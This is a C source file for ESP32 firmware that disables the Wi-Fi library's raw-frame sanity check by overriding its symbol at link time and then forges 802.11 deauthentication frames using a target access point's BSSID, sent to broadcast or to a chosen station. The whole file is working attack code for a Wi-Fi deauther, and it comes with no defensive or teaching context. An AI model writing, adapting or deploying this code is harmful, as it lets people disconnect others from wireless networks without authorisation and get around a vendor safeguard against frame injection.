/**
 * @file wsl_bypasser.c
 * @brief Implementation of the Wi-Fi Stack Libraries bypasser.
 *
 * `ieee80211_raw_frame_sanity_check` is a real symbol exported by the closed-source
 * libnet80211.a blob (confirmed present for esp32s3 in this IDF version) that normally
 * rejects raw-injected frames of certain subtypes. Defining our own no-op copy of it
 * here and linking with -Wl,-zmuldefs (see CMakeLists.txt) makes the linker prefer this
 * definition over the blob's, disabling that check.
 * @see Technique origin: https://github.com/GANESH-ICMC/esp32-deauther
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";

/**
 * @brief Deauthentication frame template.
 *
 * Destination address (offset 4) defaults to broadcast; overwritten per-call
 * when targeting a specific STA. Reason code 0x02 = INVALID_AUTHENTICATION
 * (802.11-2016 [9.4.1.7; Table 9-45]).
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // destination (addr1)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // source (addr2)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (addr3)
    0xf0, 0xff, 0x02, 0x00
};

/**
 * @attention Not meant to be called; only exists to override the blob's symbol.
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, const uint8_t *sta_mac) {
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    if (sta_mac != NULL) {
        memcpy(&deauth_frame[4], sta_mac, 6);
    }
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}
